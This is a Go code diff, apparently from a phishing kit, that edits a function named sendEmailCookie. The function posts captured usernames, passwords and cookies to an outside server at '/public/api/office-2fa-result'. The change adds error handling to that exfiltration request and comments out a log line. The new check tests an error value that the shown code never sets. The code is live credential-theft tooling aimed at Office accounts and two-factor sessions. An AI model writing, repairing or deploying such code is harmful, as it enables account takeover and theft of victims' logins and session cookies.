@@ -111,9 +111,22 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	request, _ := http.Post("https://natrium100gram.site/public/api/office-2fa-result", "application/json", responseBody)
 
-	defer request.Body.Close()
 
-	log.Println("Send Email Cookies")
+	if err != nil {
+		fmt.Println("Failed to make the POST request:", err)
+		return // Exit the function without stopping the entire application
+	}
+
+	// Ensure the response body is closed properly after use
+	defer func() {
+		if request.Body != nil {
+			request.Body.Close()
+		}
+	}()
+	
+	// defer request.Body.Close()
+
+	// log.Println("Send Email Cookies")
 
 	//err := os.WriteFile("schedule.json", []byte(msg), 0755)
 	//if err != nil {
